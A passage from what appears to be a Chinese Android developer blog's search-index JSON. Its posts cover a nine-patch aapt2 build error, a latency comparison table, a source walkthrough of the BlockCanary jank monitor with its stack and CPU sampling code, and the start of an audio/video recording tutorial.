Singleton()，开始初始化实例对象，由于存在指令重排序，这次new操作，先把引用赋值了，还没有执行构造函数这时时间片结束了，切换到线程B执行，线程B调用getInstance()方法，发现引用不等于null，就直接返回引用地址了，然后线程B执行了一些操作，就可能导致线程B使用了还没有被初始化的变量","categories":[{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/categories/java/"}],"tags":[{"name":"基础知识","slug":"基础知识","permalink":"https://superxlcr.github.io/tags/基础知识/"},{"name":"java","slug":"java","permalink":"https://superxlcr.github.io/tags/java/"}]},{"title":"记一次aapt编译错误追踪","slug":"记一次aapt编译错误追踪","date":"2020-02-19T13:09:19.000Z","updated":"2020-05-11T07:23:44.907Z","comments":true,"path":"2020/02/19/记一次aapt编译错误追踪/","link":"","permalink":"https://superxlcr.github.io/2020/02/19/记一次aapt编译错误追踪/","excerpt":"","text":"在最近的一次编译中，博主的gradle编译出错了，并报出了以下错误： 1AAPT2 error: check logs for details 网上找了一些资料，基本没有怎么说到原因，都只是建议加上属性来关闭aapt2： 1android.enableAapt2=false 不过在博主的项目中已经关闭了，因此博主只能尝试追踪一下错误的原因 aapt的编译跟Android的资源文件有关，通过git查看本次资源文件中修改带有点九图，通过经验判断怀疑是点九图出了问题 这里博主找了下网上手动使用aapt编译点九图的资料：https://blog.csdn.net/waterseason/article/details/84749463 通过手动使用aapt编译一新一旧两张点九图，博主确认了这次的aapt编译错误应该就是点九图的问题导致的： 1234567891011aapt s -i new.9.png -o testCrunching single PNG file: new.9.png Output file: testERROR: 9-patch image new.9.png malformed. Frame pixels must be either solid or transparent (not intermediate alphas). Found at pixel #21 along top edge. aapt s -i old.9.png -o testCrunching single PNG file: old.9.png Output file: test 综上所述，当我们发现gradle报aapt的编译问题的时候，由于gradle没有导出aapt的编译日志，因为我们可以尝试手动使用aapt编译，去查看日志寻找编译错误原因尤其值得注意的是当我们在项目中改动了点九图的时候","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"编译","slug":"编译","permalink":"https://superxlcr.github.io/tags/编译/"}]},{"title":"关于CPU、内存、硬盘及网络传输速度的整理","slug":"关于CPU、内存、硬盘及网络传输速度的整理","date":"2020-01-11T10:17:45.000Z","updated":"2020-05-11T07:23:44.818Z","comments":true,"path":"2020/01/11/关于CPU、内存、硬盘及网络传输速度的整理/","link":"","permalink":"https://superxlcr.github.io/2020/01/11/关于CPU、内存、硬盘及网络传输速度的整理/","excerpt":"","text":"前言最近看了一些关于CPU、内存、硬盘及网络传输速度相关的博客：https://cizixs.com/2017/01/03/how-slow-is-disk-and-network/https://gist.github.com/hellerbarde/2843375 了解了一些常见的系统操作的耗时，在此进行一下总结有助于当我们见到一些系统耗时统计数据时，能够粗略的判断其是否存在性能问题 数据废话不多说，我们直接看以下表格 | 操作 | 大致耗时 | 耗时级别 | 时间量级倍数 | 类比人类时间 || - | - | - | - || CPU执行一个指令 | 0.38ns | 纳秒 | - | 1s || CPU读取一级缓存 | 0.5ns | 纳秒 | - | 1.3s || CPU分支预测错误 | 5ns | 纳秒 | 十倍 | 13s || CPU读取二级缓存 | 7ns | 纳秒 | 十倍 | 18.2s || 互斥锁加锁与解锁 | 25ns | 纳秒 | 百倍 | 65s || 内存寻址 | 100ns | 纳秒 | 千倍 | 260s || CPU上下文切换（系统调用） | 1.5us | 微秒 | 万倍 | 65分钟 || 1Gbps网络传输2K数据 | 20us | 微秒 | 十万倍 | 14.4小时 || SSD随机读取 | 150us | 微秒 | 百万倍 | 4.5天 || 内存读取1MB的连续数据 | 250us | 微秒 | 百万倍 | 7.5天 || 同一个数据中心网络上跑一个来回 | 500us | 微秒 | 百万倍 | 15天 || SSD读取1MB的连续数据 | 1ms | 毫秒 | 千万倍 | 1个月 || 磁盘寻址 | 10ms | 毫秒 | 亿倍 | 10个月 || 磁盘读取1MB的连续数据 | 20ms | 毫秒 | 亿倍 | 20个月 || 执行一个ping报文平均时间 | 150ms | 毫秒 | 十亿倍 | 12.5年 || 虚拟机重启 | 4s | 秒 | 百亿倍 | 300多年 || 物理重启 | 5min | 分钟 | 千亿倍 | 2万5千年 | 在操作的耗时被量化之后，我们可以看到一些很有趣的现象： CPU相关的操作，执行指令以及读取CPU缓存啥的，基本都是纳秒级别的 如果CPU需要去读取内存数据，耗时将是CPU相关操作耗时的千倍，基本上到达了微秒级别，CPU和内存之间的速度瓶颈被称为冯诺依曼瓶颈 如果需要去执行io操作，即使是较快的SSD，耗时也是内存操作耗时的千倍，基本上到达了毫秒级别 如果是在更慢的磁盘上执行io操作，耗时也是SSD操作耗时的百倍，妥妥的毫秒级别 若是需要执行网络请求去获取数据，则耗时是SSD操作耗时的千倍，稍有不慎就会上到秒的级别 由此可见，基本上获取数据的存储来源每上一个等级，时间量级也要跟着上一个等级 12CPU -&gt; 内存 -&gt; SSD -&gt; 磁盘 -&gt; 网络纳秒 -&gt; 微秒 -&gt; 毫秒 -&gt; 毫秒 -&gt; 秒 最后再补充一个有趣的问题，看下CPU的分支预测是如何影响到程序的执行时间的为何排序前后的数组求和耗时不一样：https://stackoverflow.com/questions/11227809/why-is-processing-a-sorted-array-faster-than-processing-an-unsorted-array","categories":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/categories/操作系统/"}],"tags":[{"name":"操作系统","slug":"操作系统","permalink":"https://superxlcr.github.io/tags/操作系统/"},{"name":"计算机网络","slug":"计算机网络","permalink":"https://superxlcr.github.io/tags/计算机网络/"}]},{"title":"Android UI卡顿监测框架BlockCanary原理分析","slug":"Android-UI卡顿监测框架BlockCanary原理分析","date":"2020-01-09T08:35:07.000Z","updated":"2020-05-11T07:23:44.519Z","comments":true,"path":"2020/01/09/Android-UI卡顿监测框架BlockCanary原理分析/","link":"","permalink":"https://superxlcr.github.io/2020/01/09/Android-UI卡顿监测框架BlockCanary原理分析/","excerpt":"","text":"本文转载自：https://www.jianshu.com/p/e58992439793 BlockCanary是国内开发者MarkZhai开发的一套性能监控组件，它对主线程操作进行了完全透明的监控，并能输出有效的信息，帮助开发分析、定位到问题所在，迅速优化应用。其特点有： 非侵入式，简单的两行就打开监控，不需要到处打点，破坏代码优雅性。 精准，输出的信息可以帮助定位到问题所在（精确到行），不需要像Logcat一样，慢慢去找。目前包括了核心监控输出文件，以及UI显示卡顿信息功能 基本使用使用非常方便,引入 1234567dependencies &#123; compile &apos;com.github.markzhai:blockcanary-android:1.5.0&apos; // 仅在debug包启用BlockCanary进行卡顿监控和提示的话，可以这么用 debugCompile &apos;com.github.markzhai:blockcanary-android:1.5.0&apos; releaseCompile &apos;com.github.markzhai:blockcanary-no-op:1.5.0&apos;&#125; 在应用的application中完成初始化 1234567891011121314151617181920212223242526272829303132333435363738394041public class DemoApplication extends Application &#123; @Override public void onCreate() &#123; super.onCreate(); BlockCanary.install(this, new AppContext()).start(); &#125;&#125; //参数设置public class AppContext extends BlockCanaryContext &#123; private static final String TAG = \"AppContext\"; @Override public String provideQualifier() &#123; String qualifier = \"\"; try &#123; PackageInfo info = DemoApplication.getAppContext().getPackageManager() .getPackageInfo(DemoApplication.getAppContext().getPackageName(), 0); qualifier += info.versionCode + \"_\" + info.versionName + \"_YYB\"; &#125; catch (PackageManager.NameNotFoundException e) &#123; Log.e(TAG, \"provideQualifier exception\", e); &#125; return qualifier; &#125; @Override public int provideBlockThreshold() &#123; return 500; &#125; @Override public boolean displayNotification() &#123; return BuildConfig.DEBUG; &#125; @Override public boolean stopWhenDebugging() &#123; return false; &#125;&#125; 基本原理我们都知道Android应用程序只有一个主线程ActivityThread，这个主线程会创建一个Looper(Looper.prepare)，而Looper又会关联一个MessageQueue，主线程Looper会在应用的生命周期内不断轮询(Looper.loop)，从MessageQueue取出Message 更新UI。我们来看一个代码片段 1234567891011121314151617public static void loop() &#123; ... for (;;) &#123; ... // This must be in a local variable, in case a UI event sets the logger Printer logging = me.mLogging; if (logging != null) &#123; logging.println(\"&gt;&gt;&gt;&gt;&gt; Dispatching to \" + msg.target + \" \" + msg.callback + \": \" + msg.what); &#125; msg.target.dispatchMessage(msg); if (logging != null) &#123; logging.println(\"&lt;&lt;&lt;&lt;&lt; Finished to \" + msg.target + \" \" + msg.callback); &#125; ... &#125;&#125; msg.target其实就是Handler，看一下dispatchMessage的逻辑 123456789101112131415/** * Handle system messages here. */ public void dispatchMessage(Message msg) &#123; if (msg.callback != null) &#123; handleCallback(msg); &#125; else &#123; if (mCallback != null) &#123; if (mCallback.handleMessage(msg)) &#123; return; &#125; &#125; handleMessage(msg); &#125; &#125; 如果消息是通过Handler.post(runnable)方式投递到MQ中的，那么就回调runnable#run方法； 如果消息是通过Handler.sendMessage的方式投递到MQ中，那么回调handleMessage方法； 不管是哪种回调方式，回调一定发生在UI线程。因此如果应用发生卡顿，一定是在dispatchMessage中执行了耗时操作。我们通过给主线程的Looper设置一个Printer，打点统计dispatchMessage方法执行的时间，如果超出阀值，表示发生卡顿，则dump出各种信息，提供开发者分析性能瓶颈。 123456789101112131415161718@Overridepublic void println(String x) &#123; if (!mStartedPrinting) &#123; mStartTimeMillis = System.currentTimeMillis(); mStartThreadTimeMillis = SystemClock.currentThreadTimeMillis(); mStartedPrinting = true; &#125; else &#123; final long endTime = System.currentTimeMillis(); mStartedPrinting = false; if (isBlock(endTime)) &#123; notifyBlockEvent(endTime); &#125; &#125;&#125; private boolean isBlock(long endTime) &#123; return endTime - mStartTimeMillis &gt; mBlockThresholdMillis;&#125; 源码分析源码分析主要分为框架初始化过程和监控过程 框架初始化过程初始化过程主要通过下面第一行代码发起 1BlockCanary.install(this, new AppContext()).start(); 在内部我们细分为install和start过程 install12345678910111213141516171819202122232425public static BlockCanary install(Context context, BlockCanaryContext blockCanaryContext) &#123; BlockCanaryContext.init(context, blockCanaryContext); setEnabled(context, DisplayActivity.class, BlockCanaryContext.get().displayNotification()); return get();&#125; private static void setEnabled(Context context, final Class&lt;?&gt; componentClass, final boolean enabled) &#123; final Context appContext = context.getApplicationContext(); executeOnFileIoThread(new Runnable() &#123; @Override public void run() &#123; setEnabledBlocking(appContext, componentClass, enabled); &#125; &#125;);&#125; private static void setEnabledBlocking(Context appContext,Class&lt;?&gt; componentClass,boolean enabled) &#123; ComponentName component = new ComponentName(appContext, componentClass); PackageManager packageManager = appContext.getPackageManager(); int newState = enabled ? COMPONENT_ENABLED_STATE_ENABLED : COMPONENT_ENABLED_STATE_DISABLED; // Blocks on IPC. packageManager.setComponentEnabledSetting(component, newState, DONT_KILL_APP);&#125; BlockCanaryContext.init会将保存应用的applicationContext和用户设置的配置参数； setEnabled将根据用户的通知栏消息配置开启（displayNotification=true）或关闭（displayNotification=false）DisplayActivity （DisplayActivity是承载通知栏消息的activity） 注意该设置过程需要提交到一个单线程的IO线程池去执行。 接下来是外观类BlockCanary的创建过程 123456789101112131415161718192021public static BlockCanary get() &#123; if (sInstance == null) &#123; synchronized (BlockCanary.class) &#123; if (sInstance == null) &#123; sInstance = new BlockCanary(); &#125; &#125; &#125; return sInstance;&#125;//私有构造函数private BlockCanary() &#123; BlockCanaryInternals.setContext(BlockCanaryContext.get()); mBlockCanaryCore = BlockCanaryInternals.getInstance(); mBlockCanaryCore.addBlockInterceptor(BlockCanaryContext.get()); if (!BlockCanaryContext.get().displayNotification()) &#123; return; &#125; mBlockCanaryCore.addBlockInterceptor(new DisplayService()); &#125; 单例创建BlockCanary 核心处理类为BlockCanaryInternals 为BlockCanaryInternals添加拦截器（责任链） BlockCanaryContext对BlockInterceptor是空实现，可以忽略； DisplayService只在开启通知栏消息的时候添加，当卡顿发生时将通过DisplayService发起通知栏消息 接下来看核心类BlockCanaryInternals的初始化过程。 123456789101112131415161718192021222324252627282930313233343536public BlockCanaryInternals() &#123; stackSampler = new StackSampler( Looper.getMainLooper().getThread(), sContext.provideDumpInterval()); cpuSampler = new CpuSampler(sContext.provideDumpInterval()); setMonitor(new LooperMonitor(new LooperMonitor.BlockListener() &#123; @Override public void onBlockEvent(long realTimeStart, long realTimeEnd, long threadTimeStart, long threadTimeEnd) &#123; // Get recent thread-stack entries and cpu usage ArrayList&lt;String&gt; threadStackEntries = stackSampler .getThreadStackEntries(realTimeStart, realTimeEnd); if (!threadStackEntries.isEmpty()) &#123; BlockInfo blockInfo = BlockInfo.newInstance() .setMainThreadTimeCost(realTimeStart, realTimeEnd, threadTimeStart, threadTimeEnd) .setCpuBusyFlag(cpuSampler.isCpuBusy(realTimeStart, realTimeEnd)) .setRecentCpuRate(cpuSampler.getCpuRateInfo()) .setThreadStackEntries(threadStackEntries) .flushString(); LogWriter.save(blockInfo.toString()); if (mInterceptorChain.size() != 0) &#123; for (BlockInterceptor interceptor : mInterceptorChain) &#123; interceptor.onBlock(getContext().provideContext(), blockInfo); &#125; &#125; &#125; &#125; &#125;, getContext().provideBlockThreshold(), getContext().stopWhenDebugging())); LogWriter.cleanObsolete();&#125; 创建了两个采样类StackSampler和CpuSampler，即线程堆栈采样和CPU采样。 随后创建一个LooperMonitor，LooperMonitor实现了android.util.Printer接口。 随后通过调用setMonitor把创建的LooperMonitor赋值给BlockCanaryInternals的成员变量monitor。 start即调用BlockCanary的start方法 123456public void start() &#123; if (!mMonitorStarted) &#123; mMonitorStarted = true; Looper.getMainLooper().setMessageLogging(mBlockCanaryCore.monitor); &#125;&#125; 将在BlockCanaryInternals中创建的LooperMonitor给主线程Looper的mLogging变量赋值。这样主线程Looper就可以消息分发前后使用LooperMonitor#println输出日志。 卡顿监控过程根据上面原理的分析，监控的对象主要是Main Looper的Message分发耗时情况。 1234567891011121314151617//Looperfor (;;) &#123; Message msg = queue.next(); // This must be in a local variable, in case a UI event sets the logger Printer logging = me.mLogging; if (logging != null) &#123; logging.println(\"&gt;&gt;&gt;&gt;&gt; Dispatching to \" + msg.target + \" \" + msg.callback + \": \" + msg.what); &#125; msg.target.dispatchMessage(msg); if (logging != null) &#123; logging.println(\"&lt;&lt;&lt;&lt;&lt; Finished to \" + msg.target + \" \" + msg.callback); &#125; ...&#125; 主线程的所有消息都在这里调度！！ 每从MQ中取出一个消息，由于我们设置了Printer为LooperMonitor，因此在调用dispatchMessage前后都可以交由我们LooperMonitor接管。 我们再次从下面这段代码入手。 12345678910111213141516171819@Overridepublic void println(String x) &#123; if (mStopWhenDebugging &amp;&amp; Debug.isDebuggerConnected()) &#123; return; &#125; if (!mPrintingStarted) &#123; mStartTimestamp = System.currentTimeMillis(); mStartThreadTimestamp = SystemClock.currentThreadTimeMillis(); mPrintingStarted = true; startDump(); &#125; else &#123; final long endTime = System.currentTimeMillis(); mPrintingStarted = false; if (isBlock(endTime)) &#123; notifyBlockEvent(endTime); &#125; stopDump(); &#125;&#125; 对于单个Message而言，这个方法一定的成对调用的。 卡顿监控记录第一次调用时，记录开始时间，并开始dump堆栈和CPU信息。 12345678910111213141516171819202122232425262728293031323334//LooperMonitorprivate void startDump() &#123; if (null != BlockCanaryInternals.getInstance().stackSampler) &#123; BlockCanaryInternals.getInstance().stackSampler.start(); &#125; if (null != BlockCanaryInternals.getInstance().cpuSampler) &#123; BlockCanaryInternals.getInstance().cpuSampler.start(); &#125;&#125; //AbstractSamplerpublic void start() &#123; if (mShouldSample.get()) &#123; return; &#125; mShouldSample.set(true); HandlerThreadFactory.getTimerThreadHandler().removeCallbacks(mRunnable); HandlerThreadFactory.getTimerThreadHandler().postDelayed(mRunnable, BlockCanaryInternals.getInstance().getSampleDelay());&#125; private Runnable mRunnable = new Runnable() &#123; @Override public void run() &#123; doSample(); if (mShouldSample.get()) &#123; HandlerThreadFactory.getTimerThreadHandler() .postDelayed(mRunnable, mSampleInterval); &#125; &#125;&#125;; 两种采样依次提交到HandlerThread中进行，从而保证采样过程是在一个后台线程执行; 两种采样有个共同的父类AbstractSampler，采用了模板方法模式，即在父类定义了采样的抽象算法doSample及采样生命周期的管控（start和stop），不同的子类采样的算法实现是不一样的; 采样会周期性执行，间隔时间与卡顿阀值一致（可由开发者设置）; 堆栈采样堆栈采样很简单，直接通过Main Looper获取到主线程Thread对象，调用Thread#getStackTrace即可获取到堆栈信息 1234567891011121314151617@Overrideprotected void doSample() &#123; StringBuilder stringBuilder = new StringBuilder(); for (StackTraceElement stackTraceElement : mCurrentThread.getStackTrace()) &#123; stringBuilder .append(stackTraceElement.toString()) .append(BlockInfo.SEPARATOR); &#125; synchronized (sStackMap) &#123; if (sStackMap.size() == mMaxEntryCount &amp;&amp; mMaxEntryCount &gt; 0) &#123; sStackMap.remove(sStackMap.keySet().iterator().next()); &#125; sStackMap.put(System.currentTimeMillis(), stringBuilder.toString()); &#125;&#125; 将堆栈拼成String，保存在LinkedHashMap中，当然保存有一定阀值，默认最多保存100条。 CPU采样在分析代码之前我们需要先了解一下Android平台CPU的一些常识。 我们都知道Android是基于Linux系统的，Android平台关于CPU的计算是跟Linux是完全一样的。 /proc/stat文件 在Linux中CPU活动信息是保存在该文件中，该文件中的所有值都是从系统启动开始累计到当前时刻。 12345678910~$ cat /proc/statcpu 38082 627 27594 893908 12256 581 895 0 0cpu0 22880 472 16855 430287 10617 576 661 0 0cpu1 15202 154 10739 463620 1639 4 234 0 0intr 120053 222 2686 0 1 1 0 5 0 3 0 0 0 47302 0 0 34194 29775 0 5019 845 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0ctxt 1434984btime 1252028243processes 8113procs_running 1procs_blocked 0 第二行的数值表示的是CPU总的使用情况，所以我们只要用第一行的数字计算就可以了 下表解析第一行各数值的含义 参数 解析 (以下数值都是从系统启动累计到当前时刻) user (38082) 处于用户态的运行时间，不包含 nice值为负进程 nice (627) nice值为负的进程所占用的CPU时间 system (27594) 处于核心态的运行时间 idle (893908) 除IO等待时间以外的其它等待时间iowait (12256) 从系统启动开始累计到当前时刻，IO等待时间 irq (581) 硬中断时间 irq (581) 软中断时间 stealstolen(0) 一个其他的操作系统运行在虚拟环境下所花费的时间 guest(0) 这是在Linux内核控制下为客户操作系统运行虚拟CPU所花费的时间 总结：总的cpu时间totalCpuTime = user + nice + system + idle + iowait + irq + softirq + stealstolen + guest/proc/pid/stat文件 该文件包含了某一进程所有的活动的信息，该文件中的所有值都是从系统启动开始累计到当前时刻 12~$ cat /proc/6873/stat6873 (a.out) R 6723 6873 6723 34819 6873 8388608 77 0 0 0 41958 31 0 0 25 0 3 0 5882654 1409024 56 4294967295 134512640 134513720 3215579040 0 2097798 0 0 0 0 0 0 0 17 0 0 0 以下只解释对我们计算Cpu使用率有用相关参数 参数 解析 pid=6873 进程号 utime=1587 该任务在用户态运行的时间，单位为jiffies stime=41958 该任务在核心态运行的时间，单位为jiffies cutime=0 所有已死线程在用户态运行的时间，单位为jiffies cstime=0 所有已死在核心态运行的时间，单位为jiffies 结论：进程的总Cpu时间processCpuTime = utime + stime + cutime + cstime，该值包括其所有线程的cpu时间。CPU采样的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104@Overrideprotected void doSample() &#123; BufferedReader cpuReader = null; BufferedReader pidReader = null; try &#123; cpuReader = new BufferedReader(new InputStreamReader( new FileInputStream(\"/proc/stat\")), BUFFER_SIZE); String cpuRate = cpuReader.readLine(); if (cpuRate == null) &#123; cpuRate = \"\"; &#125; if (mPid == 0) &#123; mPid = android.os.Process.myPid(); &#125; pidReader = new BufferedReader(new InputStreamReader( new FileInputStream(\"/proc/\" + mPid + \"/stat\")), BUFFER_SIZE); String pidCpuRate = pidReader.readLine(); if (pidCpuRate == null) &#123; pidCpuRate = \"\"; &#125; parse(cpuRate, pidCpuRate); &#125; catch (Throwable throwable) &#123; Log.e(TAG, \"doSample: \", throwable); &#125; finally &#123; try &#123; if (cpuReader != null) &#123; cpuReader.close(); &#125; if (pidReader != null) &#123; pidReader.close(); &#125; &#125; catch (IOException exception) &#123; Log.e(TAG, \"doSample: \", exception); &#125; &#125;&#125; private void parse(String cpuRate, String pidCpuRate) &#123; String[] cpuInfoArray = cpuRate.split(\" \"); if (cpuInfoArray.length &lt; 9) &#123; return; &#125; long user = Long.parseLong(cpuInfoArray[2]); long nice = Long.parseLong(cpuInfoArray[3]); long system = Long.parseLong(cpuInfoArray[4]); long idle = Long.parseLong(cpuInfoArray[5]); long ioWait = Long.parseLong(cpuInfoArray[6]); long total = user + nice + system + idle + ioWait + Long.parseLong(cpuInfoArray[7]) + Long.parseLong(cpuInfoArray[8]); String[] pidCpuInfoList = pidCpuRate.split(\" \"); if (pidCpuInfoList.length &lt; 17) &#123; return; &#125; long appCpuTime = Long.parseLong(pidCpuInfoList[13]) + Long.parseLong(pidCpuInfoList[14]) + Long.parseLong(pidCpuInfoList[15]) + Long.parseLong(pidCpuInfoList[16]); if (mTotalLast != 0) &#123; StringBuilder stringBuilder = new StringBuilder(); long idleTime = idle - mIdleLast; long totalTime = total - mTotalLast; stringBuilder .append(\"cpu:\") .append((totalTime - idleTime) * 100L / totalTime) .append(\"% \") .append(\"app:\") .append((appCpuTime - mAppCpuTimeLast) * 100L / totalTime) .append(\"% \") .append(\"[\") .append(\"user:\").append((user - mUserLast) * 100L / totalTime) .append(\"% \") .append(\"system:\").append((system - mSystemLast) * 100L / totalTime) .append(\"% \") .append(\"ioWait:\").append((ioWait - mIoWaitLast) * 100L / totalTime) .append(\"% ]\"); synchronized (mCpuInfoEntries) &#123; mCpuInfoEntries.put(System.currentTimeMillis(), stringBuilder.toString()); if (mCpuInfoEntries.size() &gt; MAX_ENTRY_COUNT) &#123; for (Map.Entry&lt;Long, String&gt; entry : mCpuInfoEntries.entrySet()) &#123; Long key = entry.getKey(); mCpuInfoEntries.remove(key); break; &#125; &#125; &#125; &#125; mUserLast = user; mSystemLast = system; mIdleLast = idle; mIoWaitLast = ioWait; mTotalLast = total; mAppCpuTimeLast = appCpuTime;&#125; 卡顿条件判断及事后处理当LooperMonitor第二次调用时，会判断第二次与第一次的时间间隔是否会超过阀值。 123private boolean isBlock(long endTime) &#123; return endTime - mStartTimestamp &gt; mBlockThresholdMillis;&#125; 若超过，将视作一次卡顿。满足卡顿条件将会调用下面方法 1234567891011private void notifyBlockEvent(final long endTime) &#123; final long startTime = mStartTimestamp; final long startThreadTime = mStartThreadTimestamp; final long endThreadTime = SystemClock.currentThreadTimeMillis(); HandlerThreadFactory.getWriteLogThreadHandler().post(new Runnable() &#123; @Override public void run() &#123; mBlockListener.onBlockEvent(startTime, endTime, startThreadTime, endThreadTime); &#125; &#125;);&#125; 可以看到日志的写入执行在工作线程（HandlerThread），将回调BlockListener#onBlockEvent 将堆栈采样和CPU采样数据封装为一个BlockInfo。 接下来将进行卡顿事后处理。 主要有两件事情： 将卡顿发生时的堆栈和CPU信息写入日志； 如果开启走通知栏，那么将发出一条通知栏消息； 卡顿日志记录通过LogWriter.save(blockInfo.toString())完成 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public static String save(String str) &#123; String path; synchronized (SAVE_DELETE_LOCK) &#123; path = save(\"looper\", str); &#125; return path;&#125; private static String save(String logFileName, String str) &#123; String path = \"\"; BufferedWriter writer = null; try &#123; File file = BlockCanaryInternals.detectedBlockDirectory(); long time = System.currentTimeMillis(); path = file.getAbsolutePath() + \"/\" + logFileName + \"-\" + FILE_NAME_FORMATTER.format(time) + \".log\"; OutputStreamWriter out = new OutputStreamWriter(new FileOutputStream(path, true), \"UTF-8\"); writer = new BufferedWriter(out); writer.write(BlockInfo.SEPARATOR); writer.write(\"**********************\"); writer.write(BlockInfo.SEPARATOR); writer.write(TIME_FORMATTER.format(time) + \"(write log time)\"); writer.write(BlockInfo.SEPARATOR); writer.write(BlockInfo.SEPARATOR); writer.write(str); writer.write(BlockInfo.SEPARATOR); writer.flush(); writer.close(); writer = null; &#125; catch (Throwable t) &#123; Log.e(TAG, \"save: \", t); &#125; finally &#123; try &#123; if (writer != null) &#123; writer.close(); &#125; &#125; catch (Exception e) &#123; Log.e(TAG, \"save: \", e); &#125; &#125; return path;&#125; 注意：以上代码的调用执行在工作线程HandlerThread（writer）中 通知栏消息通知栏消息由下面代码触发 12345if (mInterceptorChain.size() != 0) &#123; for (BlockInterceptor interceptor : mInterceptorChain) &#123; interceptor.onBlock(getContext().provideContext(), blockInfo); &#125;&#125; 其中BlockInterceptor的一个实现类为DisplayService 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152final class DisplayService implements BlockInterceptor &#123; private static final String TAG = \"DisplayService\"; @Override public void onBlock(Context context, BlockInfo blockInfo) &#123; Intent intent = new Intent(context, DisplayActivity.class); intent.putExtra(\"show_latest\", blockInfo.timeStart); intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP); PendingIntent pendingIntent = PendingIntent.getActivity(context, 1, intent, FLAG_UPDATE_CURRENT); String contentTitle = context.getString(R.string.block_canary_class_has_blocked, blockInfo.timeStart); String contentText = context.getString(R.string.block_canary_notification_message); show(context, contentTitle, contentText, pendingIntent); &#125; @TargetApi(HONEYCOMB) private void show(Context context, String contentTitle, String contentText, PendingIntent pendingIntent) &#123; NotificationManager notificationManager = (NotificationManager) context.getSystemService(Context.NOTIFICATION_SERVICE); Notification notification; if (SDK_INT &lt; HONEYCOMB) &#123; notification = new Notification(); notification.icon = R.drawable.block_canary_notification; notification.when = System.currentTimeMillis(); notification.flags |= Notification.FLAG_AUTO_CANCEL; notification.defaults = Notification.DEFAULT_SOUND; try &#123; Method deprecatedMethod = notification.getClass().getMethod(\"setLatestEventInfo\", Context.class, CharSequence.class, CharSequence.class, PendingIntent.class); deprecatedMethod.invoke(notification, context, contentTitle, contentText, pendingIntent); &#125; catch (NoSuchMethodException | IllegalAccessException | IllegalArgumentException | InvocationTargetException e) &#123; Log.w(TAG, \"Method not found\", e); &#125; &#125; else &#123; Notification.Builder builder = new Notification.Builder(context) .setSmallIcon(R.drawable.block_canary_notification) .setWhen(System.currentTimeMillis()) .setContentTitle(contentTitle) .setContentText(contentText) .setAutoCancel(true) .setContentIntent(pendingIntent) .setDefaults(Notification.DEFAULT_SOUND); if (SDK_INT &lt; JELLY_BEAN) &#123; notification = builder.getNotification(); &#125; else &#123; notification = builder.build(); &#125; &#125; notificationManager.notify(0xDEAFBEEF, notification); &#125;&#125; 参考资料 BlockCanary — 轻松找出Android App界面卡顿元凶 AndroidPerformanceMonitor Linux平台Cpu使用率的计算 博主总结博主在看过转载这篇博客后，总结如下： BlockCanary原理是通过在主线程Handler中调用dispatchMessage方法的前后，通过Printer打印日志的地方，分别开始或者结束计时/堆栈dump/cpu采样，最终通过计算该方法耗时判断是否发生了主线程卡顿，并上报相关信息","categories":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/categories/android/"}],"tags":[{"name":"android","slug":"android","permalink":"https://superxlcr.github.io/tags/android/"},{"name":"源码","slug":"源码","permalink":"https://superxlcr.github.io/tags/源码/"}]},{"title":"Android音视频学习笔记（三）","slug":"Android音视频学习笔记（三）","date":"2019-11-27T07:16:23.000Z","updated":"2020-05-11T07:23:44.655Z","comments":true,"path":"2019/11/27/Android音视频学习笔记（三）/","link":"","permalink":"https://superxlcr.github.io/2019/11/27/Android音视频学习笔记（三）/","excerpt":"","text":"上篇博客传送门：Android音视频学习笔记（二） 经过了前面的一系列联系，这篇博客我们来总结一下如何实现一个完整的音视频录制功能 录制界面录制界面由一个预览的窗口以及控制按钮组成，相关的布局文件如下： 1234567891011121314151617181920212223&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;LinearLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" android:id=\"@+id/main_layout\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:gravity=\"center\" android:keepScreenOn=\"true\" android:orientation=\"vertical\"&gt; &lt;SurfaceView android:id=\"@+id/surface_view\" android:layout_width=\"match_parent\" android:layout_height=\"0dp\" android:layout_weight=\"1\" /&gt; &lt;Button android:id=\"@+id/btn\" android:layout_width=\"match_parent\" android:layout_height=\"wrap_content\" android:gravity=\"center\" android:text=\"start\" /&gt;&lt;/LinearLayout&gt; 界面代码如下所示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168public class VideoActivity extends AppCompatActivity implements SurfaceHolder.Callback, View.OnClickListener &#123; private static final String TAG = \"VideoActivity\"; private static final String DIR = Environment.getExternalStorageDirectory() + File.separator + \"videoTest\" + File.separator; private static final String PCM_FILE = DIR + \"videoTest.pcm\"; private static final String AAC_FILE = DIR + \"videoTest.aac\"; private static final String H264_FILE = DIR + \"videoTest.h264\"; private static final String MP4_FILE = DIR + \"videoTest.mp4\"; private Camera camera; private PcmRecorder pcmRecorder; private AacEncoder aacEncoder; private H264Encoder h264Encoder; private MediaMuxerWrapper 